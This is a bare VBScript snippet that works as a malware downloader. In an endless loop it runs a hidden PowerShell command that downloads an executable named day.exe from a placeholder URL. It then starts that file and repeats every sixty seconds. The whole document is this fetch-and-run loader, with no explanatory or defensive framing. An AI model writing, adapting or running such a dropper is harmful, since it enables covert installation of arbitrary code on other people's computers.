do
	Set ws = CreateObject("Wscript.Shell")
	ws.run "cmd /c PowerShell (New-Object System.Net.WebClient).DownloadFile('URL','day.exe');Start-Process 'day.exe'",vbhide
	WSH.Sleep 60000
loop